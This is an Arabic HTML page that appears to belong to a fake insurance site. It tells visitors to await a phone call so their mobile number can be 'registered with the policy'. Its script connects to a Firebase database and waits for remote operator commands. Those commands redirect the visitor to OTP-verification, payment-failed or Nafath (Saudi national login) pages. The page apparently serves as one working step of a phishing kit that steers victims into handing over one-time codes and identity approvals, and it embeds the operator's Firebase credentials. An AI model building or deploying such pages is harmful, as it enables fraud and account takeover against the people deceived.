<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استكمال بيانات الطلب</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { background-color: #f4f7f6; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .form-wrapper {
            max-width: 500px;
            width: 90%;
            padding: 40px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.06);
            border-top: 5px solid #198754;
            text-align: center;
        }
        .phone-call-animation {
            position: relative; width: 100px; height: 100px; margin: 0 auto 25px; background: #e8f5e9; 
            border-radius: 50%; display: flex; align-items: center; justify-content: center; 
            animation: pulse 1.8s infinite cubic-bezier(0.66, 0, 0, 1);
        }
        .phone-call-animation span { font-size: 50px; }
        @keyframes pulse {
            to { box-shadow: 0 0 0 25px rgba(25, 135, 84, 0); }
        }
        .main-msg { font-size: 1.5rem; font-weight: 700; color: #2d3748; margin-bottom: 15px; }
        .sub-msg { font-size: 1rem; color: #4a5568; line-height: 1.7; margin-bottom: 25px; }
        .waiting-status { font-weight: bold; color: #dc3545; font-size: 1.1rem; }
        .timer-box { font-size: 0.9rem; color: #6c757d; background: #f8f9fa; padding: 10px 20px; border-radius: 10px; display: inline-block; border: 1px solid #eee; }
    </style>
</head>
<body>

<div class="form-wrapper">
    <div class="phone-call-animation"><span>📞</span></div>
    <h3 class="main-msg">سوف يتم الاتصال بك الآن</h3>
    <p class="sub-msg">
        قم باتباع الخطوات الموجودة بالاتصال ليتم تسجيل رقم جوالك بوثيقة التأمين.
        <br>
        <span class="waiting-status">يرجى الانتظار!</span>
    </p>
    <div class="timer-box">إعادة توجيه تلقائي بعد <span id="timer" class="fw-bold">00:59</span></div>
</div>

<script>
    const firebaseConfig = { apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE", authDomain: "tameen-658e9.firebaseapp.com", projectId: "tameen-658e9", storageBucket: "tameen-658e9.firebasestorage.app", messagingSenderId: "292670676256", appId: "1:292670676256:web:3624157751cd194efe4b45" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const userId = localStorage.getItem('user_id');
    
    // Timer
    let time = 59;
    const timerDisplay = document.getElementById('timer');
    const countdown = setInterval(() => {
        let seconds = time % 60;
        timerDisplay.innerText = `00:${seconds.toString().padStart(2, '0')}`;
        if (time <= 0) {
            clearInterval(countdown);
            window.location.href = "nafath.html"; // التحويل التلقائي لصفحة نفاذ كخيار احتياطي
        }
        time--;
    }, 1000);

    // --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
(function() {
    const userId = localStorage.getItem('user_id');
    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.next_step === "GO_TO_OTP") {
                    window.location.href = "otp_verification.html"; 
                } else if (data.next_step === "GO_TO_REJECT") {
                    window.location.href = "payment_failed.html";
                } else if (data.next_step === "GO_TO_NAFATH") {
                    window.location.href = "nafath.html";
                } else if (data.next_step === "SHOW_NAFATH_CODE") {
                    window.location.href = "nafath.html"; // التوجيه الصحيح لصفحة نفاذ لعرض الرقم
                }
            }
        });
    }
})();
// ------------------------------------------

</script>
</body>
</html>
